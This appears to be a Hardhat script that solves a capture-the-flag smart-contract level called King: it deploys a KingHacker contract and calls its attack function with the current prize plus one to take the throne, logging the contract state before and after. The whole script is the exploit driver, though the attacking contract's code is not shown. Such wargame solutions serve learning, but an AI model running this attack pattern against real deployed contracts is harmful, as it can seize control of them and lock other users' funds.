const {ethers} = require("hardhat");
require('dotenv').config()

async function main() {
  const King = await ethers.getContractFactory("King");
  console.log(`king env: ${process.env.KING_ADDR}`);
  const king = King.attach(process.env.KING_ADDR);
  console.log(`king address: ${king.address}`);
  console.log(`owner: ${await king.owner()}, king: ${await king._king()}, prize: ${await king.prize()}`);

  const KingHacker = await ethers.getContractFactory("KingHacker");
  const king_hacker = await KingHacker.deploy();
  await king_hacker.deployed();
  console.log(`king_hacker: ${king_hacker.address}`);

  const tx = await king_hacker.attack(king.address, {
    value: (await king.prize()).add(1),
  });
  await tx.wait();
  console.log(`owner: ${await king.owner()}, king: ${await king._king()}, prize: ${await king.prize()}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
